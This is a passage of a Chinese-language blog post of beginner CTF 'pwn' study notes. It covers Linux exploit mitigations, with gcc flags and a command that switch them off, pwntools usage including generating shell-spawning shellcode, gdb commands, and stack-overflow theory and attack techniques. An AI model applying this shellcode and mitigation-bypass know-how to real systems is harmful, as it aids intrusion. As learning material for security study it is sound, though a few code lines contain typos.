<p>（此时的我并不懂GOT是啥玩意儿……）</p>
<p>如果开启了FULL RELRO，那么我们是无法修改got表的</p>
<h3 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h3><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。</p>
<p>cookie信息在Linux中被称为canary</p>
<p>通过验证cookie，来判断执行的代码是不是恶意代码。嗯，应该是这个意思</p>
<p>如果该项保护被打开那么无法直接覆盖EIP让程序任意跳转，因为在跳转后将会进行cookie校验（可绕过）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				// 默认情况下，不开启Canary保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>

<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>作用：栈上的数据没有执行权限,防止栈溢出+ 跳到栈上执行shellcode</p>
<p>gcc编译器默认开启了NX选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c // 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c // 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c // 开启NX保护</span><br></pre></td></tr></table></figure>

<h3 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE(ASLR)"></a>PIE(ASLR)</h3><p>该项表示地址随机化保护，如果开启了该项那么程序每次运行的地址都会变化，如果未开启那么No PIE（0x8048000）括号内的代表程序基址</p>
<p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br><span class="line">可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</span><br><span class="line"></span><br><span class="line">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">gcc -o test test.c			// 默认情况下，开启PIE保护</span><br><span class="line">gcc -no-pie -o test test.c		// 禁用PIE保护</span><br></pre></td></tr></table></figure>

<p>作用：代码部分地址无关，防止构造ROP链进行攻击</p>
<h2 id="简单使用pwntools"><a href="#简单使用pwntools" class="headerlink" title="简单使用pwntools"></a>简单使用pwntools</h2><p>神库，学起来</p>
<blockquote>
<p><strong>pwntools</strong>是一个CTF框架和漏洞利用开发库，用Python开发，<strong>旨在让使用者简单快速的编写exploit</strong>。</p>
</blockquote>
<p>导入pwntools包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure>

<p><strong>context</strong>是pwntools用来设置环境的功能。一些二进制文件的情况不同，设置环境来正常运行exp，例如一些时候需要进行汇编，32位汇编和64位汇编不同，若不设置context可能会导致一些问题</p>
<p>os是设置系统   arch是设置架构  debug是<strong>设置日志记录级别</strong>，方便出现问题的时候排查错误。设置后，通过管道发送和接收的数据都会被打印在屏幕上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br></pre></td></tr></table></figure>

<p>生成shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>通过ip和端口号链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一种连接方式，通过ip和port去连接</span><br><span class="line">p = remote(&#x27;127.0.0.1&#x27;, 8888)  </span><br><span class="line"># 第二种连接方式，通过ssh连接</span><br><span class="line">shell = ssh(host=&#x27;192.168.14.144&#x27;, user=&#x27;root&#x27;, port=2222, password=&#x27;123456&#x27;)</span><br><span class="line">#第三种连接方式，本地调试</span><br><span class="line">p = porcess(&quot;./文件名&quot;)</span><br><span class="line">#关闭连接</span><br><span class="line">close() </span><br></pre></td></tr></table></figure>

<p>pwntools提供的有<strong>打包函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p32/p64: 打包一个整数，分别打包为32位或64位</span><br><span class="line">u32/u64: 解包一个字符串，得到整数</span><br><span class="line">payload = p32(0xdeadbeef)  </span><br><span class="line">payload = p64(0xdeadbeef)  </span><br></pre></td></tr></table></figure>

<p>打包的时候要指定程序是32位还是64位的，他们之间打包后的长度是不同的。<br>建立连接后就可以<strong>发送和接收数据</strong>了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conn.send(data) #发送数据</span><br><span class="line">conn.sendline(data) #发送一行数据，相当于在数据后面加\n</span><br><span class="line">#接收数据，numb制定接收的字节，timeout指定超时</span><br><span class="line">conn.recv(numb = 2048, timeout = default)</span><br><span class="line">#接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">conn.recvline(keepends=True)</span><br><span class="line">#接受数据直到我们设置的标志出现</span><br><span class="line">conn.recvuntil(&quot;Hello,World\n&quot;,drop=fasle)    #接收到指定数据结束</span><br><span class="line">conn.recvall()  #一直接收直到 EOF(文件结束符)</span><br><span class="line">conn.recvrepeat(timeout = default)  #持续接受直到EOF或timeout</span><br><span class="line">#直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>汇编与反汇编</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; asm(&#x27;mov eax, 0&#x27;)   #汇编</span><br><span class="line">&#x27;\xb8\x00\x00\x00\x00&#x27;</span><br><span class="line">&gt;&gt;&gt; disasm(&#x27;\xb8\x0b\x00\x00\x00&#x27;)  #反汇编</span><br><span class="line">&#x27;   0:   b8 0b 00 00 00          mov    eax,0xb&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="简单使用IDA"><a href="#简单使用IDA" class="headerlink" title="简单使用IDA"></a>简单使用IDA</h2><p>神器，学起来^_^</p>
<p>暂且贴几个会看的链接，以后自己用了在慢慢整理</p>
<p>IDA的简单使用</p>
<p><a href="https://www.cnblogs.com/connerlink/p/15639752.html">https://www.cnblogs.com/connerlink/p/15639752.html</a></p>
<p>通过一个例子来介绍IDA的简单使用</p>
<p><a href="https://blog.csdn.net/Casuall/article/details/100191563">https://blog.csdn.net/Casuall/article/details/100191563</a></p>
<h2 id="简单使用pwngdb"><a href="#简单使用pwngdb" class="headerlink" title="简单使用pwngdb"></a>简单使用pwngdb</h2><p>妈的，不是为了打比赛我哪会知道gdb是啥玩意儿啊</p>
<p>亲民的用法介绍不多，B站有个小姐姐的视频私以为很不错，不过不是pwngdb</p>
<p>这里写命令+用法，会慢慢更新</p>
<p>启动gdb，终端输入gdb即可</p>
<p><img src="/2022/03/13/pwn%E5%AD%A6%E4%B9%A0%E5%B0%8F%E6%80%BB%E7%BB%93/gdb1.png"></p>
<p>pwngdb启动后,要先使用file或exec-file命令指出要运行的程序，不然会报错</p>
<p>热知识：gdb中也是可以使用Tab键的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run 文件名                 #运行文件（或 r 文件名）</span><br><span class="line">quit                       #退出gdb（或  q ）</span><br><span class="line">list                     #显示源程序，跟数字就是显示第x行</span><br><span class="line">编译程序时一定要加上-g参数，把源程序信息编译到执行文件中、这样才可以用list命令显示程序的源代码</span><br><span class="line">info                       #查看源代码的内存地址</span><br><span class="line">info line后面可以跟：行号、函数名、文件名:行号、文件名:函数名</span><br><span class="line">disassemble                #反汇编， disassemble main反汇编main函数</span><br><span class="line">disassemble /m             #/m是同时显示源码 </span><br><span class="line">break                       #下断点，后跟要设置断点的行数（b同理）</span><br><span class="line">info breakpoints           #查看断点信息 info break同理</span><br><span class="line">backtrace               #查看栈信息。当程序调用了一个函数时，函数的地址、参数、局部变量都会被压入栈中。此时，可以用gdb命令来查看当前栈中的信息。(bt命令同理)</span><br><span class="line">info all-registers           #查看所有寄存器的值，包括浮点寄存器</span><br><span class="line">info registers                #查看寄存器的值，除了浮点寄存器</span><br><span class="line">print                        #修改被调试程序运行时的变量值(p同理)</span><br><span class="line">whatis                      #显示某个变量的名字</span><br><span class="line">jump                         #跳转执行</span><br><span class="line">next                      #不进入的单步执行 </span><br><span class="line">step                       #进入的单步执行</span><br><span class="line">set args                      #可指定运行时参数</span><br><span class="line">show args                   #命令可以查看设置好的运行参数</span><br><span class="line">examine （n/f/u）addr         #查看内存地址中的值（x同理）   </span><br></pre></td></tr></table></figure>

<p>n 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。<br>f 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是s，如果地十是指令地址，那么格式可以是i。<br>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。</p>
<p>n/f/u三个参数可以一起使用</p>
<p>【以后可能在这里或者另开一个笔记写使用，目前只是简单整理】</p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h3><p>对于二进制安全,栈结构是最基本要了解的东西</p>
<p>【栈】作为偏旁为木的左右结构的汉字，理解起来并不难。意思大概可以概括为客栈、通道、木制品这三样。在计算机术语中的栈，就是指数据暂时存储的地方。</p>
<p>既然是数据暂时存储的地方自然而然的就有进栈、出栈的说法了——栈，一种先进后出的数据结构</p>
<p>栈是一段连续的内存单元，也就是一段连续的内存地址。</p>
<p>栈就是一个桶，后放进去的先拿出来，它下面本来有的东西要等它出来之后才能出来（先进后出Last In First Out)</p>
<blockquote>
<p>堆栈本身就是栈，只是换了个抽象的名字。</p>
<blockquote>
<p>栈（操作系统）：由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。</p>
<p>堆（操作系统）： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收，分配方式倒是类似于链表。</p>
</blockquote>
</blockquote>
<p><strong>从内存角度看</strong>: </p>
<p> 入栈: push    将16位寄存器或者内存中的字型数据 —–&gt;栈顶标记的上面</p>
<p> 出栈: pop    将栈顶标记所标识的字型数据 —–&gt; 16位寄存器或内存中</p>
<p>在8086cpu中，在任意时刻，将段地址寄存器ss和偏移地址寄存器sp所组合出来的内存地址当做栈顶标记。</p>
<p><strong>栈的作用</strong></p>
<p>1.栈可以临时性保存数据   2. 可以交换数据</p>
<p>在内存中，在内存10000H~1000FH处分配了16个单元的栈空间。然鹅系统并不会把他当做栈使用</p>
<p>这时候就需要用到寄存器SS、SP（堆栈和指针）了</p>
<p>当寄存器SS、SP所指向的地址就会被当做栈使用</p>
<p><strong>关于SS和SP如何寻址</strong></p>
<p>8086CPU中提供两个16位的地址，一个是段地址，用来指向一个段空间（最大空间为64KB），另一个是偏移地址</p>
<p><strong>物理地址=段地址x16+偏移地址</strong>    </p>
<h3 id="溢出（Overflow）"><a href="#溢出（Overflow）" class="headerlink" title="溢出（Overflow）"></a>溢出（Overflow）</h3><p>【溢出】这个词语的解释是充满某个容器并向外流出。作为一种被黑客利用的漏洞，它的解释是：开发的程序，加上一些精心构造的参数运行后，可以得到电脑的管理员权限，你在你自己电脑上能够做的事情，黑客也做到，等于你的电脑就是他的了。溢出是程序设计者设计时的不足所带来的错误。</p>
<h4 id="溢出的原因"><a href="#溢出的原因" class="headerlink" title="溢出的原因"></a><strong>溢出的原因</strong></h4><p>现实状况</p>
<p>在几乎所有计算机语言中，不管是新的语言还是旧的语言，使缓冲区溢出的任何尝试通常都会被该语言本身自动检测并阻止（比如通过引发一个异常或根据需要给缓冲区添加更多空间）。但是有两种语言不是这样：C 和 C++ 语言。C 和 C++ 语言通常只是让额外的数据乱写到其余内存的任何位置，而这种情况可能被利用从而导致恐怖的结果。更糟糕的是，用 C 和 C++ 编写正确的代码来始终如一地处理缓冲区溢出则更为困难；很容易就会意外地导致缓冲区溢出。除了 C 和 C++ 使用得 非常广泛外，上述这些可能都是不相关的事实；例如，Red Hat Linux 7.1 中 86% 的代码行都是用 C 或 C ++ 编写的。因此，大量的代码对这个问题都是脆弱的，因为实现语言无法保护代码避免这个问题。</p>
<p>客观原因</p>
<p>在 C 和 C++ 语言本身中，这个问题是不容易解决的。该问题基于 C 语言的根本设计决定（特别是 C 语言中指针和数组的处理方式）。由于 C++ 是最兼容的 C 语言超集，它也具有相同的问题。存在一些能防止这个问题的 C/C++ 兼容版本，但是它们存在极其严重的性能问题。而且一旦改变 C 语言来防止这个问题，它就不再是 C 语言了。许多语言（比如 Java 和 C#）在语法上类似 C，但它们实际上是不同的语言，将现有 C 或 C++ 程序改为使用那些语言是一项艰巨的任务。</p>
<p>普遍因素</p>
<p>然而，其他语言的用户也不应该沾沾自喜。有些语言存在允许缓冲区溢出发生的“转义”子句。Ada 一般会检测和防止缓冲区溢出（即针对这样的尝试引发一个异常），但是不同的程序可能会禁用这个特性。C# 一般会检测和防止缓冲区溢出，但是它允许程序员将某些例程定义为“不安全的”，而这样的代码 可能 会导致缓冲区溢出。因此如果您使用那些转义机制，就需要使用 C/C++ 程序所必须使用的相同种类的保护机制。许多语言都是用 C 语言来实现的（至少部分是用 C 语言来实现的 ），并且用任何语言编写的所有程序本质上都依赖用 C 或 C++ 编写的库。因此，所有程序都会继承那些问题，所以了解这些问题是很重要的。</p>
<h4 id="溢出原因"><a href="#溢出原因" class="headerlink" title="溢出原因"></a>溢出原因</h4><p>数据类型超过了计算机字长的界限就会出现数据溢出的情况。导致内存溢出问题的原因有很多，比如：<br>(1) 使用非类型安全(non-type-safe)的语言如 C/C++ 等。<br>(2) 以不可靠的方式存取或者复制内存缓冲区。<br>(3)编译器设置的内存缓冲区太靠近关键数据结构。</p>
<p><strong>因素分析</strong></p>
<p>1.内存溢出问题是 C 语言或者 C++ 语言所固有的缺陷，它们既不检查数组边界，又不检查类型可靠性(type-safety)。众所周知，用 C/C++ 语言开发的程序由于目标代码非常接近机器内核，因而能够直接访问内存和寄存器，这种特性大大提升了 C/C++ 语言代码的性能。只要合理编码，C/C++应用程序在执行效率上必然优于其它高级语言。然而，C/C++ 语言导致内存溢出问题的可能性也要大许多。其他语言也存在内存溢出问题，但它往往不是程序员的失误，而是应用程序的运行时环境出错所致。</p>
<p>2.当应用程序读取用户(也可能是恶意攻击者)数据，试图复制到应用程序开辟的内存缓冲区中，却无法保证缓冲区的空间足够时，内存缓冲区就可能会溢出。想一想，如果你向200ml的玻璃杯中倒入 250ml 的水，那么多出来 50ml的水怎么办？当然会漫到玻璃杯外面了</p>
<p>3.最重要的是，C/C++编译器开辟的内存缓冲区常常邻近重要的数据结构。假设某个函数的堆栈紧接在在内存缓冲区后面时，其中保存的函数返回地址就会与内存缓冲区相邻。此时，恶意攻击者就可以向内存缓冲区复制大量数据，从而使得内存缓冲区溢出并覆盖原先保存于堆栈中的函数返回地址。这样，函数的返回地址就被攻击者换成了他指定的数值；一旦函数调用完毕，就会继续执行“函数返回地址”处的代码。非但如此，C++ 的某些其它数据结构，比如 v-table 、例外事件处理程序、函数指针等，也可能受到类似的攻击。</p>
<h4 id="栈为什么会溢出"><a href="#栈为什么会溢出" class="headerlink" title="栈为什么会溢出"></a>栈为什么会溢出</h4><p>对每个程序来说，栈能使用的内存是有限的，一般是 1M~8M，这在编译时就已经决定了，程序运行期间不能再改变。如果程序使用的栈内存超出最大值，就会发生栈溢出（Stack Overflow）错误，程序就崩溃了。</p>
<p>这个就像木桶里的水，木桶的容量有限，水满了自然会溢出来。</p>
<h3 id="栈溢出-1"><a href="#栈溢出-1" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<p>pwn手法有很多，包括：</p>
<p>修改返回地址，让其指向溢出数据中的一段指令（shellcode）</p>
<p>修改返回地址，让其指向内存中已有的某个函数（return2libc）</p>
<p>修改返回地址，让其指向内存中已有的一段指令（ROP）</p>
<p>修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</p>
<p>【这里空一些示例，还在摸索ing】</p>
<h1 id="引用资料出处"><a href="#引用资料出处" class="headerlink" title="引用资料出处"></a>引用资料出处</h1><p>如何通俗地解释什么是寄存器？<a href="https://www.zhihu.com/question/20539463">https://www.zhihu.com/question/20539463</a></p>
<p>汇编常用指令 <a href="https://ai-exception.blog.csdn.net/article/details/82950848">https://ai-exception.blog.csdn.net/article/details/82950848</a></p>
<p>8086汇编指令笔记  <a href="https://blog.csdn.net/qq_32651225/article/details/53928654?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_32651225/article/details/53928654?spm=1001.2014.3001.5502</a></p>
<p>汇编入门 <a href="https://blog.csdn.net/qq_27803491/article/details/123026031">https://blog.csdn.net/qq_27803491/article/details/123026031</a></p>
<p>汇编语言学习笔记(【汇编语言】小甲鱼零基础汇编)  <a href="https://blog.csdn.net/inv1796915552/article/details/109559495">https://blog.csdn.net/inv1796915552/article/details/109559495</a></p>
<p>linux漏洞缓解机制介绍 <a href="https://bbs.pediy.com/thread-226696.htm">https://bbs.pediy.com/thread-226696.htm</a></p>
<p>gdb使用总结 <a href="https://www.cnblogs.com/cxz2009/archive/2011/08/31/2160855.html">https://www.cnblogs.com/cxz2009/archive/2011/08/31/2160855.html</a></p>
<p>Linux GDB使用总结 <a href="https://blog.csdn.net/Utotao/article/details/91354704">https://blog.csdn.net/Utotao/article/details/91354704</a></p>
<p>实例—使用gcc编译器 <a href="https://wenku.baidu.com/view/75b45b57cc17552707220898">https://wenku.baidu.com/view/75b45b57cc17552707220898</a></p>
<p>溢出（计算机程序） <a href="https://baike.baidu.com/item/%E6%BA%A2%E5%87%BA/1775951?fr=aladdin">https://baike.baidu.com/item/%E6%BA%A2%E5%87%BA/1775951?fr=aladdin</a></p>
<p>利用汇编详解栈结构  <a href="https://www.cnblogs.com/wh4am1/p/6818892.html">https://www.cnblogs.com/wh4am1/p/6818892.html</a></p>
<p>CTF Wiki  <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/</a></p>
<p>安全总结—-栈溢出（一）  <a href="https://bbs.pediy.com/thread-185767.htm">https://bbs.pediy.com/thread-185767.htm</a></p>
<p>栈溢出基础（一）  <a href="https://www.secpulse.com/archives/70608.html">https://www.secpulse.com/archives/70608.html</a></p>
]]></content>
      <categories>
        <category>我的pwn学习之路</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
